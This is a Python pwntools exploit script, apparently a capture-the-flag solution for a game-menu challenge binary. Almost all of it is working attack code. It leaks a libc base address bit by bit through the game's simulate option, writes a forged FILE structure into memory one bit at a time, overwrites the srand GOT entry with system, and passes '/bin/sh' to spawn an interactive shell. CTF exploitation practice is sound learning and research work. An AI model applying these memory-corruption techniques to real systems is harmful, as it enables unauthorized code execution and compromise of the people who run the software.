#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './chall'
#context.terminal = ['tmux', 'new-window']
context.terminal = ["tmux", "splitw", "-hb"]
argv = []
env = {'LD_PRELOAD':'./libc-2.39.so'}
libc = ELF('./libc-2.39.so')
e = ELF(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def fight(inp):
    io.sendlineafter(">", "f")
    io.sendlineafter("Player plays", str(inp))

def simulate(bot, player):
    io.sendlineafter(">", "s")
    io.sendlineafter("number:", bot)
    io.sendlineafter("number:", player)

# data read into _IO_read_base
# _IO_buf_base = points to the start of the file buffer
#   + point this to the scanf area ? some area we have control over
#
def write_data(data):
    for b in data:
        for i in range(8):
            if b & (1 << i):
                fight(0xffffffffffffffff)
            else:
                fight(0)

def reseed():
    io.sendlineafter(">", "r")

def leak_libc():
    # 1 => bot wins, 0 => i win
    leak = 0x0
    bits_amt = 0
    #simulate("-", "100")
    for i in range(0x40):
        leak |= (1 << i)
        simulate("-", str(leak))
        res = io.recvuntil("Fight bot")
        if b"Bot win" not in res:
            bits_amt = i+1
            break

    leak = (1 << bits_amt) - 1
    bit_pos = bits_amt
    #gdb.attach(io, gdbscript)

    # 1 => bit flip was wrong, 0 => bit flip was right
    # bot wins => bit flip was wrong, i win => bit flip was right
    for i in range(0x40):
        if leak & (1 << i) == 0:
            break
        leak &= ~(1 << i)
        leak |= (1 << bit_pos)
        simulate("-", str(leak))
        res = io.recvuntil("Fight bot")
        if b"Bot win" in res:
            # undo the bit flip
            leak |= (1 << i)
            # undo the additional bit setting
            leak &= ~(1 << bit_pos)
        else:
            bit_pos += 1

    #gdb.attach(io, gdbscript)

    return leak

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
break *0x401683
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start(argv, env=env)

simulate("-", "100")

leak = leak_libc()
libc.address = leak - 0x955c2
log.info(f"Libc leak: {hex(libc.address)}")

# increase games
for i in range(64):
    fight(0)

# seed
payload = p64(0x4142)
# FILE* ptr (fake it to point just after)
payload += p64(0x4040a0)

file = FileStructure()
file.flags = 0x00000000fbad2088
file._IO_buf_base = e.got['srand']-0x8
file._IO_buf_end = e.got['srand']+0x100
file._IO_read_base = e.bss()+0x40
file._IO_read_ptr = e.bss()+0x40
file._IO_read_end = e.bss()+0x40
file.vtable = libc.address + 0x202030
file._lock = libc.address + 0x205720
file.fileno = 0
payload += bytes(file)
payload += b"/bin/sh\x00"

write_data(payload)
io.sendline("r")

payload = p64(0x404180)
payload += p64(libc.sym['system'])
io.sendline(payload)

io.interactive()
